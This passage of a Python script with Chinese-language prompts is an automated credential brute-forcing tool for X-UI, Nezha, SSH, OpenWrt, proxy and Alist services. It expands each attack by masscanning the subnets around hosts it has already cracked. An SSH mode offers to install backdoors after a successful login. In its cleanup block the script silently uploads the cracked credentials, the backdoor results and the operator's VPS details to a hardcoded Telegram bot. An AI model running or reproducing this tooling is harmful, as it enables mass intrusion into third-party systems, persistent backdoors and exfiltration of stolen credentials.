    use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ").strip().lower()
    if use_custom == 'y':
        return load_credentials(template_mode, auth_mode=2) # 复用逻辑
    else:
        if template_mode == 8: usernames, passwords = ["root"], ["password"]
        else: usernames, passwords = ["admin"], ["admin"]
        return usernames, passwords, credentials


def get_vps_info():
    import requests
    try:
        response = requests.get("http://ip-api.com/json/?fields=country,query", timeout=10)
        response.raise_for_status()
        data = response.json()
        return data.get('query', 'N/A'), data.get('country', 'N/A')
    except requests.exceptions.RequestException as e:
        print(f"⚠️ 获取VPS信息失败: {e}")
    return "N/A", "N/A"

def get_nezha_server(config_file="config.yml"):
    if not os.path.exists(config_file):
        return "N/A"
    try:
        import yaml
        with open(config_file, 'r', encoding='utf-8') as f:
            config_data = yaml.safe_load(f)
            if isinstance(config_data, dict) and 'server' in config_data:
                return config_data['server']
    except Exception as e:
        print(f"⚠️ 解析 {config_file} 失败: {e}")
    return "N/A"

def parse_result_line(line):
    """解析结果行并返回ip, port, user, password。"""
    proxy_match = re.match(r'(\w+)://(?:([^:]+):([^@]+)@)?([\d\.]+):(\d+)', line)
    if proxy_match:
        user = proxy_match.group(2) or ''
        password = proxy_match.group(3) or ''
        ip = proxy_match.group(4)
        port = proxy_match.group(5)
        return ip, port, user, password

    parts = line.split()
    if len(parts) >= 1:
        ip_port = parts[0]
        user = parts[1] if len(parts) > 1 else ''
        password = parts[2] if len(parts) > 2 else ''
        if ':' in ip_port:
            ip, port = ip_port.split(':', 1)
            return ip, port, user, password
            
    return None, None, None, None

def analyze_and_expand_scan(result_file, template_mode, params, template_map, masscan_rate):
    if not os.path.exists(result_file) or os.path.getsize(result_file) == 0:
        return set()

    print("\n--- 正在分析结果以寻找可扩展的IP网段... ---")
    with open(result_file, 'r', encoding='utf-8') as f:
        master_results = {line.strip() for line in f}
    
    ips_to_analyze = master_results
    all_newly_verified_ips = set()

    for i in range(2): # 执行两轮扩展
        print(f"\n--- [扩展扫描 第 {i+1}/2 轮] ---")
        
        groups = {}
        for line in ips_to_analyze:
            ip, port, user, password = parse_result_line(line)
            if not ip: continue
            
            subnet = ".".join(ip.split('.')[:3]) + ".0/24"
            key = (subnet, port, user, password)
            
            if key not in groups: groups[key] = set()
            groups[key].add(ip)

        expandable_targets = [key for key, ips in groups.items() if len(ips) >= 2]

        if not expandable_targets:
            print(f"  - 第 {i+1} 轮未找到符合条件的IP集群，扩展扫描结束。")
            break

        print(f"  - 第 {i+1} 轮发现 {len(expandable_targets)} 个可扩展的IP集群。")
        
        newly_verified_this_round = set()
        masscan_output_file = "masscan_results.tmp"

        for j, (subnet, port, user, password) in enumerate(expandable_targets):
            print(f"\n  --- [扫描集群 {j+1}/{len(expandable_targets)}] 目标: {subnet} 端口: {port} ---")
            
            masscan_ips_for_this_cluster = set()
            for k in range(2):
                print(f"    - Masscan 第 {k+1}/2 轮...")
                try:
                    if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
                    masscan_cmd = ["masscan", subnet, "-p", port, "--rate=" + str(masscan_rate), "-oG", masscan_output_file]
                    subprocess.run(masscan_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)

                    with open(masscan_output_file, 'r') as f:
                        for line in f:
                            if line.startswith("Host:"):
                                masscan_ips_for_this_cluster.add(line.split()[1])
                except subprocess.TimeoutExpired:
                    print(f"      - ⚠️ Masscan 扫描超时（超过120秒），可能系统负载过高。")
                except (subprocess.CalledProcessError, FileNotFoundError) as e:
                    print(f"      - ❌ Masscan 扫描失败: {e}")
            
            ips_to_verify = masscan_ips_for_this_cluster - master_results
            print(f"    - Masscan 两轮共发现 {len(masscan_ips_for_this_cluster)} 个存活主机，其中 {len(ips_to_verify)} 个是新目标。")
            if not ips_to_verify:
                continue

            verification_input_file = "verification_input.tmp"
            with open(verification_input_file, 'w') as f:
                for ip in ips_to_verify:
                    f.write(f"{ip}:{port}\n")
            
            print("    - 正在对新发现的IP进行二次验证...")
            
            current_params = params.copy()
            current_params['usernames'] = [user] if user else []
            current_params['passwords'] = [password] if password else []
            
            template_lines = template_map[template_mode]
            generate_go_code(template_lines, **{**current_params, **params})

            executable_name = compile_go_program()

            try:
                run_env = os.environ.copy()
                total_memory = psutil.virtual_memory().total
                mem_limit = int(total_memory * 0.70 / 1024 / 1024)
                run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"
                run_env["GOGC"] = "50"
                
                verification_output_file = "verification_output.tmp"
                if os.path.exists(verification_output_file): os.remove(verification_output_file)

                cmd = ['./' + executable_name, verification_input_file, verification_output_file]
                
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=run_env)
                
                for line in iter(lambda: process.stdout.readline(), b''):
                    sys.stdout.write(line.decode('utf-8', errors='ignore'))
                    sys.stdout.flush()

                process.wait()

                if process.returncode != 0:
                    raise subprocess.CalledProcessError(process.returncode, cmd)
                
                if os.path.exists(verification_output_file):
                    with open(verification_output_file, 'r') as f:
                        new_finds = {line.strip() for line in f}
                        print(f"    - 二次验证成功 {len(new_finds)} 个新目标。")
                        newly_verified_this_round.update(new_finds)
                    os.remove(verification_output_file)
            except Exception as e:
                print(f"    - ❌ 二次验证失败: {e}")
            
            if os.path.exists(verification_input_file): os.remove(verification_input_file)
        
        new_ips_this_round = newly_verified_this_round - master_results
        if not new_ips_this_round:
            print(f"--- 第 {i+1} 轮未发现任何全新的IP，扩展扫描结束。 ---")
            break
        
        master_results.update(new_ips_this_round)
        ips_to_analyze = new_ips_this_round

    if os.path.exists(masscan_output_file): os.remove(masscan_output_file)

    with open(result_file, 'r', encoding='utf-8') as f:
        initial_set = {line.strip() for line in f}
    return master_results - initial_set


if __name__ == "__main__":
    start = time.time()
    interrupted = False
    final_result_file = None
    total_ips = 0 # 初始化 total_ips
    
    TEMP_PART_DIR = "temp_parts"
    TEMP_XUI_DIR = "xui_outputs"
    TEMP_HMSUCCESS_DIR = "temp_hmsuccess"
    TEMP_HMFAIL_DIR = "temp_hmfail"

    from datetime import datetime, timedelta, timezone
    beijing_time = datetime.now(timezone.utc) + timedelta(hours=8)
    time_str = beijing_time.strftime("%Y%m%d-%H%M")
    
    # 将prefix的定义提前
    TEMPLATE_MODE = choose_template_mode()
    mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS", 12: "Alist"}
    prefix = mode_map.get(TEMPLATE_MODE, "result")

    try:
        if not sys.stdout.isatty():
            print("❌ 错误：此脚本需要在交互式终端中运行以接收用户输入。")
            sys.exit(1)
        
        # ==================== 1. 收集所有用户输入 ====================
        print("\n=== 爆破一键启动 - 参数配置 ===")
        input_file = input_filename_with_default("请输入源文件名", "1.txt")
        if not os.path.exists(input_file):
                print(f"❌ 错误: 文件 '{input_file}' 不存在。")
                sys.exit(1)

        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            all_lines = [line.strip() for line in f if line.strip()]
            total_ips = len(all_lines)
        print(f"--- 总计 {total_ips} 个目标 ---")
        
        # ==================== 优化：动态并发建议 ====================
        total_memory_mb = psutil.virtual_memory().total / 1024 / 1024
        if total_memory_mb < 1500: # 如果内存小于 1.5GB
            print(f"⚠️ 检测到系统内存较低 ({total_memory_mb:.2f} MiB)，建议使用保守的并发数。")
            recommended_py_concurrency = 5
            recommended_go_concurrency = 20
        else:
            recommended_py_concurrency = 10
            recommended_go_concurrency = 100
        # ==========================================================
        
        print("\n--- 并发模型说明 ---")
        print("脚本将启动多个并行的扫描进程（由Python控制），每个进程内部再使用多个线程（由Go控制）进行扫描。")
        print("对于内存较小的设备，请保持“Python并发任务数”为一个较低的数值。")

        python_concurrency = input_with_default(f"请输入Python并发任务数 (推荐 {recommended_py_concurrency})", recommended_py_concurrency)
        go_internal_concurrency = input_with_default(f"请输入每个任务内部的Go并发数 (推荐 {recommended_go_concurrency})", recommended_go_concurrency)
        chunk_size = input_with_default("请输入每个小任务处理的IP数量", 500)

        params = {'semaphore_size': go_internal_concurrency} # Go程序现在使用这个参数
        params['timeout'] = input_with_default("超时时间(秒)", 3)
        masscan_rate = input_with_default("请输入Masscan扫描速率(pps)", 50000)
        
        nezha_analysis_threads = 0
        if TEMPLATE_MODE == 2:
            nezha_analysis_threads = input_with_default("请输入哪吒面板分析线程数", 50)

        AUTH_MODE = 0
        if TEMPLATE_MODE == 6: # SSH 模式
            choice = input("是否在SSH爆破成功后自动安装后门？(y/N)：").strip().lower()
            if choice == 'y':
                params['install_backdoor'] = True
                if not os.path.exists("后门命令.txt"):
                    print("❌ 未找到 后门命令.txt，已中止。")
                    sys.exit(1)
                with open("后门命令.txt", 'r', encoding='utf-8', errors='ignore') as f:
                    params['custom_cmds'] = [line.strip() for line in f if line.strip()]
            else:
                params['install_backdoor'] = False
                params['custom_cmds'] = []
        
        if TEMPLATE_MODE in [9, 10, 11]: # 代理模式
            print("\n请选择代理凭据模式：")
            print("1. 无凭据 (扫描开放代理)")
            print("2. 独立字典 (使用 username.txt 和 password.txt)")
            print("3. 组合凭据 (使用 credentials.txt, 格式 user:pass)")
            while True:
                auth_choice = input("输入 1, 2, 或 3 (默认 1): ").strip()
                if auth_choice in ["", "1"]: AUTH_MODE = 1; break
                elif auth_choice == "2": AUTH_MODE = 2; break
                elif auth_choice == "3": AUTH_MODE = 3; break
                else: print("输入无效。")
            
            if TEMPLATE_MODE == 9: params['proxy_type'] = "socks5"
            elif TEMPLATE_MODE == 10: params['proxy_type'] = "http"
            elif TEMPLATE_MODE == 11: params['proxy_type'] = "https"

        params['usernames'], params['passwords'], params['credentials'] = load_credentials(TEMPLATE_MODE, AUTH_MODE)
        params['auth_mode'] = AUTH_MODE
        
        # ==================== 2. 环境准备与编译 ====================
        check_environment(TEMPLATE_MODE)
        
        import psutil, requests, yaml
        from openpyxl import Workbook, load_workbook
        from tqdm import tqdm

        adjust_oom_score()
        check_and_manage_swap()

        os.makedirs(TEMP_PART_DIR, exist_ok=True)
        os.makedirs(TEMP_XUI_DIR, exist_ok=True)
        if TEMPLATE_MODE == 6:
            os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True)
            os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)

        template_map = {
            1: XUI_GO_TEMPLATE_1_LINES, 2: XUI_GO_TEMPLATE_2_LINES,
            6: XUI_GO_TEMPLATE_6_LINES, 7: XUI_GO_TEMPLATE_7_LINES,
            8: XUI_GO_TEMPLATE_8_LINES, 9: PROXY_GO_TEMPLATE_LINES,
            10: PROXY_GO_TEMPLATE_LINES, 11: PROXY_GO_TEMPLATE_LINES,
            12: ALIST_GO_TEMPLATE_LINES,
        }

        template_lines = template_map[TEMPLATE_MODE]
        generate_go_code(template_lines, **params)
        
        executable = compile_go_program()
        
        # ==================== 3. 执行扫描与分析 ====================
        generate_ipcx_py()
        run_scan_in_parallel(all_lines, executable, python_concurrency, go_internal_concurrency, chunk_size)
        
        merge_xui_files()
        
        initial_results_file = "xui.txt"
        if os.path.exists(initial_results_file) and os.path.getsize(initial_results_file) > 0:
            newly_found_results = analyze_and_expand_scan(initial_results_file, TEMPLATE_MODE, params, template_map, masscan_rate)
            if newly_found_results:
                print(f"--- 扩展扫描完成，共新增 {len(newly_found_results)} 个结果。正在合并... ---")
                with open(initial_results_file, 'a', encoding='utf-8') as f:
                    for result in sorted(list(newly_found_results)):
                        f.write(result + '\n')
                
                with open(initial_results_file, 'r', encoding='utf-8') as f:
                    unique_lines = sorted(list(set(f.readlines())))
                with open(initial_results_file, 'w', encoding='utf-8') as f:
                    f.writelines(unique_lines)
                print("--- 结果合并去重完成。 ---")
        
        final_txt_file = f"{prefix}-{time_str}.txt"
        final_xlsx_file = f"{prefix}-{time_str}.xlsx"
        
        if os.path.exists("xui.txt"):
            os.rename("xui.txt", final_txt_file)
            run_ipcx(final_txt_file, final_xlsx_file)

        if TEMPLATE_MODE == 2 and os.path.exists(final_txt_file) and os.path.getsize(final_txt_file) > 0:
            analysis_threads = nezha_analysis_threads
            print(f"\n--- 开始对成功的哪吒面板进行深度分析（使用 {analysis_threads} 线程）... ---")
            with open(final_txt_file, 'r', encoding='utf-8') as f:
                results = [line.strip() for line in f if line.strip()]
            
            nezha_analysis_data = {}
            
            with ThreadPoolExecutor(max_workers=analysis_threads) as executor:
                future_to_result = {executor.submit(analyze_panel, res): res for res in results}
                
                for future in tqdm(as_completed(future_to_result), total=len(results), desc="分析哪吒面板"):
                    result_line = future_to_result[future]
                    try:
                        returned_line, analysis_result = future.result()
                        if len(analysis_result) == 3:
                             nezha_analysis_data[returned_line] = analysis_result
                        else:
                             nezha_analysis_data[returned_line] = ("数据不一致", 0, "N/A")
                    except Exception as exc:
                        print(f'{result_line} 生成了一个异常: {exc}')
                        nezha_analysis_data[result_line] = ("分析异常", 0, "N/A")

            if nezha_analysis_data:
                update_excel_with_nezha_analysis(final_xlsx_file, nezha_analysis_data)

        if TEMPLATE_MODE == 6:
            merge_result_files("hmsuccess", "hmsuccess.txt", TEMP_HMSUCCESS_DIR)
            merge_result_files("hmfail", "hmfail.txt", TEMP_HMFAIL_DIR)
            if os.path.exists("hmsuccess.txt"):
                os.rename("hmsuccess.txt", f"后门成功-{time_str}.txt")
            if os.path.exists("hmfail.txt"):
                os.rename("hmfail.txt", f"后门失败-{time_str}.txt")

    except KeyboardInterrupt:
            print("\\n>>> 用户中断操作（Ctrl+C），准备清理临时文件...")
            interrupted = True
    except SystemExit as e:
            print(f"\n脚本因严重错误中止: {e}")
            interrupted = True # Treat as interruption for cleanup
    except EOFError:
            print("\\n❌ 错误：无法读取用户输入。请在交互式终端(TTY)中运行此脚本。")
            interrupted = True
    finally:
            clean_temp_files(TEMPLATE_MODE)
            end = time.time()
            cost = int(end - start)
            
            vps_ip, vps_country = get_vps_info()
            nezha_server = get_nezha_server()
            
            run_time_str = f"{cost // 60} 分 {cost % 60} 秒"
            if interrupted:
                    print(f"\n=== 脚本已被中断，中止前共运行 {run_time_str} ===")
            else:
                    print(f"\n=== 全部完成！总用时 {run_time_str} ===")

            def send_to_telegram(file_path, bot_token, chat_id, vps_ip="N/A", vps_country="N/A", nezha_server="N/A", total_ips=0, run_time_str="N/A"):
                    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
                            print(f"⚠️ Telegram 上传跳过：文件 {file_path} 不存在或为空")
                            return

                    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                    caption_text = (
                        f"VPS: {vps_ip} ({vps_country})\n"
                        f"总目标数: {total_ips}\n"
                        f"总用时: {run_time_str}\n"
                    )
                    if nezha_server != "N/A":
                        caption_text += f"哪吒Server: {nezha_server}\n"
                    caption_text += f"任务结果: {os.path.basename(file_path)}"
                    
                    with open(file_path, "rb") as f:
                            files = {'document': f}
                            data = {'chat_id': chat_id, 'caption': caption_text}
                            try:
                                    response = requests.post(url, data=data, files=files, timeout=60)
                                    if response.status_code == 200:
                                            print(f"✅ 文件 {file_path} 已发送到 Telegram")
                                    else:
                                            print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
                            except Exception as e:
                                    print(f"❌ 发送到 TG 失败：{e}")

            BOT_TOKEN = "7664203362:AAFTBPQ8Ydl9c1fqM53CSzKIPS0VBj99r0M"
            CHAT_ID = "7697235358"

            if BOT_TOKEN and CHAT_ID:
                files_to_send = []
                final_txt_file = f"{prefix}-{time_str}.txt"
                final_xlsx_file = f"{prefix}-{time_str}.xlsx"

                if os.path.exists(final_txt_file): files_to_send.append(final_txt_file)
                if os.path.exists(final_xlsx_file): files_to_send.append(final_xlsx_file)
                
                if TEMPLATE_MODE == 6:
                    success_file = f"后门成功-{time_str}.txt"
                    fail_file    = f"后门失败-{time_str}.txt"
                    if os.path.exists(success_file): files_to_send.append(success_file)
                    if os.path.exists(fail_file): files_to_send.append(fail_file)

                for f in files_to_send:
                    print(f"\n📤 正在将 {f} 上传至 Telegram ...")
                    send_to_telegram(f, BOT_TOKEN, CHAT_ID, vps_ip, vps_country, nezha_server, total_ips, run_time_str)
